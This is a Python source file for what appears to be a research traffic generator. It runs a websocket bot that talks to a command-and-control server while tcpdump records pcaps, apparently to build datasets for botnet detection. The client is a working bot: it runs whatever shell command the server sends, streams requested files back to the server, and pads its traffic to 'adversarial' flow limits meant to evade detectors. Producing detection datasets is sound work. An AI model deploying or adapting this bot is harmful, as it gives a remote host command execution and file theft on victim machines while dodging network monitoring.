"""
*****main file****** 
19.2.2025
To be able to conduct tcpdump wihtou using sudo for running the code u need to make exception
for tcpdump first using the following in the terminal:
sudo setcap cap_net_raw,cap_net_admin=eip $(which tcpdump)
---------config generator-----
    - Each client consist of 2 different configs which are combined: rce/exfil and adversarial requirements
    - Both will be generated in client side and send to server but server will control on execution of each and their termination conditions
    - After client is connected, it sends client_config including: underlaying limit,termination condition, src2dst/dst2src_max_ps
    - Then client_config would be added to the generated config in server side 
    - This way allows us to dynamically run bots with different config and criteria while capturing pcap
    - Why in client side? because client is dynamic created and deleted but server is run one time for ever, thus hard to manage different dynamic config requirements

"""
from pathlib import Path
import asyncio
import websockets, string
import json, os, random, yaml
from datetime import datetime

import subprocess, signal, traceback
from concurrent.futures import TimeoutError as ConnectionTimeoutError
from ConfigGenerator import config_generator
from get_bot_ready import get_traffic_generation_configuration, generate_atomic_combinations


class persistent_connection_via_websocket():
    def __init__(self, bot_config, server="localhost", server_port=5000):
        self.bot_config = bot_config
        self.server = server
        self.server_port = server_port
    def generate_random_string(self,size:int):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=int(size[0])))
    async def rce(self, websocket, command):
        """Executes a command and returns the output."""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            rce_output= result.stdout.strip() if result.stdout else result.stderr.strip()
            # Send response back to server
            response = json.dumps({"rce": rce_output})
            await websocket.send(response)
        except Exception as e:
            return str(e)
    async def exfil(self, websocket, file_path ,**kwargs):
            with open(file_path, 'rb') as f:
                while chunk := f.read(15336):
                    await websocket.send(chunk)
                    await asyncio.sleep(0.01)
            await websocket.send("exfil_done")  # Command to initiate the upload
    

    async def websocket_client(self,server='10.10.54.34', server_port=5000):
        uri = f"ws://{server}:{server_port}"
        async with websockets.connect(uri) as websocket:
            self.websocket = websocket
            await websocket.send(json.dumps(self.bot_config)) # send final client config including rce/exfil and adversarial to server

            # send config to server 
            while True:
                # Receive command from server
                command_message = await websocket.recv()
                command_data = json.loads(command_message)
                print(f"{list(command_data.keys())[0]}===>{list(command_data.values())[0]}")

                if "finish" in command_data:
                    break
            
                elif "rce" in  list(command_data.keys())[0] :
                    #command = list(command_data.values())[0]
                    await self.rce(websocket=websocket,command=list(command_data.values())[0])
                elif "exfil" in  list(command_data.keys())[0]:

                    await self.exfil(websocket=websocket, file_path=f"{list(command_data.values())[0]}")
                elif "src2dst_max_ps" in list(command_data.keys())[0] and command_data["src2dst_max_ps"] != None:
                    pad= self.generate_random_string(command_data["src2dst_max_ps"])
                    await websocket.send(pad)
                elif "dst2src_max_ps" in list(command_data.keys())[0] and command_data["dst2src_max_ps"] != None:
                    await websocket.recv()
                elif "src2dst_packets" in list(command_data.keys())[0] and command_data["src2dst_packets"] != None:
                    pad = ""
                    for i in range(int(command_data["src2dst_packets"][0])):
                        await websocket.send(pad) 
                    await websocket.send("END") 
                elif "dst2src_bytes" in list(command_data.keys())[0] and command_data["dst2src_bytes"] != None:
                    await websocket.recv()               
                elif "src2dst_bytes" in list(command_data.keys())[0] and command_data["src2dst_bytes"] != None:
                    pad= self.generate_random_string(command_data["src2dst_bytes"])
                    await websocket.send(pad)
                elif "dst2src_packets" in list(command_data.keys())[0] and command_data["dst2src_packets"] != None:

                    try:
                        while True:
                            message = await websocket.recv()  # Receive message from the WebSocket connection
                            if message == "END":
                                break  # Exit the loop and close the connection
                            # You can process the message here
                    except websockets.exceptions.ConnectionClosed:
                        print("Connection closed")

            await websocket.close()
  
    async def wait_closed(self):
        # Wait until the WebSocket connection is fully closed
        if self.websocket and not self.websocket.close:
            await self.websocket.wait_closed()

  #--------------starting the code----------------------------
def start_tcpdump( interface: str, output_file):
    #command = ["tcpdump", "-i", interface, "-w", output_file]
    #tcpdump_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
    command = ["tcpdump", "-i", interface, "port 5000", "-w", output_file]
    tcpdump_process = subprocess.Popen(command, preexec_fn=os.setsid)
    return tcpdump_process
def stop_tcpdump( process):
        print("---------------------------------------> tcpdump traffic capturing is stopped <---------------------------------------")
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
        #await process.wait()

def bot_activity_conf_generator(config_file_addr:str,**kwargs):
    input_kwargs = kwargs
    termination = {}
    cnf_gen= config_generator(config_file_addr)
    exec_conf= cnf_gen.config_maker()
    #--------------make termination based on termination condition and value set in underlaying
    if "termination_conditions" in input_kwargs.keys(): 
        for item in input_kwargs["termination_conditions"]:
            termination[item] = input_kwargs["underlay_limit"][item]

    #--------------
    
    client_config = (termination|exec_conf | input_kwargs) #combine all
    items = list(client_config.items())# make item position randomize
    random.shuffle(items)
    shuffled_dic ={}
    for key, value in items:
        shuffled_dic[key] = value
    return shuffled_dic



async def main():
    # get traffic generation config from user like C2 IP:Port, adversarila feature values, if traffic is collected as pcap etc.
    traffic_generation_config = get_traffic_generation_configuration() 
    print("===============Traffic Generation Configuration:===============")
    print(traffic_generation_config)
    print("================================================================")

    # loading bot_activitiy.yaml including commands to be executed on victim for system discovery or the data should be exfiled
    script_dir = Path(__file__).parent.parent
    bot_activitiy_conf_path = script_dir  / "configs" / "bot_activity.yaml"

    # start capturing traffic if user asked for traffic collection and save in the following folder
    if traffic_generation_config["capture_pcap"]:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        tcpdump_process = start_tcpdump(traffic_generation_config["pcap_interface"], f"{traffic_generation_config['pcap_save_path']}/{current_time}.pcap")
    
    # check if user wanted to realize adevrsarial pertubation values during bot<->C2 communication
    if traffic_generation_config["adversarial"]:
        #set defualt underlaying limit to adversarial features
        adversarial_feature_list = [ 'src2dst_packets', 'src2dst_bytes', 'src2dst_max_ps', 'dst2src_packets', 'dst2src_bytes', 'dst2src_max_ps' ]
        underlay_limit = {}
        # update adversarial feature pertubation values accroding to the input config 
        for key, item in traffic_generation_config["adversarial_config"].items():
            if key in adversarial_feature_list:
                underlay_limit[key] = item
            else:
                print(f"❌ Adversarial feature has not found")
                break
        #generate atomic configs according to the underlaying limit values for each indvidual flow
        atomic_config_list = generate_atomic_combinations(underlay_limit)
        
        for i, flow_config in enumerate(atomic_config_list):

            # get randomly selected list of commands (Remote Command Execution and Exfiltration) which has been mixed with indvidual atomic config    
            bot_config = bot_activity_conf_generator(config_file_addr=bot_activitiy_conf_path, **flow_config)
            print(f"=============Iteration {i}============== ")
            print(f"Generated Config:\n{bot_config}\n")

            try:
                bot = persistent_connection_via_websocket(bot_config=bot_config)
                await bot.websocket_client(server=traffic_generation_config["server_ip"], server_port=traffic_generation_config["server_port"] )

            except websockets.exceptions.ConnectionClosed as e:
                print("Connection closed:", e)
                #stop_tcpdump(tcpdump_process)

            except ConnectionRefusedError:
                print('Connection refused')

            except ConnectionTimeoutError:
                print('Connection Timeout')

            except Exception as ex:
                traceback.print_exc()

            finally:
                await bot.wait_closed()
    elif not traffic_generation_config["adversarial"]:
        for i in range(traffic_generation_config["flows_count"]): # how many iterations (i.e ä of flows) based on user input
            # get randomly selected list of commands (Remote Command Execution and Exfiltration)  ==> run without adversarial pertubation  
            bot_config = bot_activity_conf_generator(config_file_addr=bot_activitiy_conf_path) 
            print(f"=============Iteration {i}============== ")
            print(f"Generated Config:\n{bot_config}\n")

            try:
                bot = persistent_connection_via_websocket(bot_config=bot_config)
                await bot.websocket_client(server=traffic_generation_config["server_ip"], server_port=traffic_generation_config["server_port"] )

            except websockets.exceptions.ConnectionClosed as e:
                print("Connection closed:", e)
                #stop_tcpdump(tcpdump_process)

            except ConnectionRefusedError:
                print('Connection refused')

            except ConnectionTimeoutError:
                print('Connection Timeout')

            except Exception as ex:
                traceback.print_exc()

            finally:
                await bot.wait_closed()            
    if traffic_generation_config["capture_pcap"]:
        stop_tcpdump(tcpdump_process)
    await asyncio.sleep(random.randint(1,2))


if __name__ == "__main__":
    asyncio.run(main())
